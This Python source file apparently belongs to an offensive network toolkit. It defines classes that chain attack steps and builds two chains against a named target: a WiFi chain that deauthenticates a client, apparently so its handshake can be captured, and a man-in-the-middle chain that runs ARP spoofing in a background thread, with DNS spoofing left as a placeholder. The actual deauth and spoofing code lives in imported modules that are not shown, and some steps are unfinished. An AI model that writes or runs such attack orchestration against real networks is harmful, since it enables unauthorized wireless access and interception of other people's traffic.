from typing import List, Dict, Callable
import time
import threading
from .attack_logger import log_attack_step
from .wifi_deauth import WiFiDeauther
from .arp_spoof import ARPSpoofer
# from .wifi_handshake import HandshakeCapture (Assuming existing or to be built)

class AttackChain:
    """Base class for multi-step attack sequences"""
    def __init__(self, name: str):
        self.name = name
        self.steps = []
        self.running = False
        
    def add_step(self, func: Callable, args: tuple = (), kwargs: dict = {}):
        self.steps.append((func, args, kwargs))
        
    @log_attack_step
    def execute(self):
        print(f"[*] Executing Chain: {self.name}")
        self.running = True
        results = {}
        
        for i, (func, args, kwargs) in enumerate(self.steps):
            if not self.running: break
            print(f"[*] Step {i+1}/{len(self.steps)}: {func.__name__}")
            try:
                res = func(*args, **kwargs)
                results[f"step_{i}"] = res
            except Exception as e:
                print(f"[!] Chain failed at step {i}: {e}")
                self.running = False
                raise e
                
        self.running = False
        return results
        
    def stop(self):
        self.running = False

class AttackChainManager:
    """Factory and Manager for Attack Chains"""
    
    def __init__(self, interface: str):
        self.interface = interface
        
    def build_wifi_access_chain(self, target_bssid: str, target_client: str) -> AttackChain:
        """
        Builds: Deauth -> Handshake Capture Chain
        """
        chain = AttackChain(f"WiFi-Access-{target_bssid}")
        
        deauther = WiFiDeauther(self.interface)
        
        # Step 1: Start Sniffer (Async/Threaded usually, but for chain we might need better orchestration)
        # Simplified: Deauth then check for handshake
        
        chain.add_step(
            deauther.deauth,
            kwargs={'bssid': target_bssid, 'client': target_client, 'count': 5}
        )
        
        # In a real system, we'd need a "wait_for_handshake" step here
        return chain
        
    def build_mitm_chain(self, target_ip: str, gateway_ip: str) -> AttackChain:
        """
        Builds: ARP Poison -> DNS Spoof (Placeholder)
        """
        chain = AttackChain(f"MITM-{target_ip}")
        
        spoof = ARPSpoofer(self.interface, gateway_ip, target_ip)
        
        # Step 1: Enable Forwarding & Start Poisoning
        # Note: ARPSpoofer.start is a blocking loop. We need a threaded wrapper for chains.
        
        # For chain execution, we might wrap blocking calls in threads
        def start_spoof_threaded():
            t = threading.Thread(target=spoof.start, daemon=True)
            t.start()
            return t
            
        chain.add_step(start_spoof_threaded)
        
        return chain
